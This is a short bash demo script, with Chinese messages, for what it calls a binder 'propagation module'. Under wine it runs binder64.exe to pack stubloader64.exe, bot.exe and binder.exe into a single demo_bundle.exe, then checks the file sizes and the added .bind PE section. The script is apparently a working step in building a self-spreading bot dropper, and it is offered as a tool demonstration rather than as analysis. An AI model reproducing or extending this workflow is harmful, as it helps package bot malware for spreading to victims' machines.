#!/bin/bash

echo "=== Binder 传播模块演示 ==="
echo

echo "1. 检查可用的exe文件："
ls -la *.exe
echo

echo "2. 使用binder64.exe创建捆绑文件："
echo "命令: wine ./binder64.exe stubloader64.exe bot.exe binder.exe demo_bundle.exe"
wine ./binder64.exe stubloader64.exe bot.exe binder.exe demo_bundle.exe
echo

echo "3. 检查生成的捆绑文件："
if [ -f "demo_bundle.exe" ]; then
    echo "? 捆绑文件创建成功！"
    echo "文件信息："
    ls -la demo_bundle.exe
    file demo_bundle.exe
    echo
    
    echo "4. 文件大小对比："
    echo "原始文件大小："
    echo "  - stubloader64.exe: $(stat -c%s stubloader64.exe) bytes"
    echo "  - bot.exe: $(stat -c%s bot.exe) bytes"  
    echo "  - binder.exe: $(stat -c%s binder.exe) bytes"
    echo "  - 总计: $(($(stat -c%s stubloader64.exe) + $(stat -c%s bot.exe) + $(stat -c%s binder.exe))) bytes"
    echo "捆绑后文件大小: $(stat -c%s demo_bundle.exe) bytes"
    echo
    
    echo "5. PE文件结构分析："
    echo "捆绑文件现在包含10个节区（原stubloader有9个节区 + 新增的.bind节区）"
    echo
else
    echo "? 捆绑文件创建失败！"
fi

echo "=== 演示完成 ==="
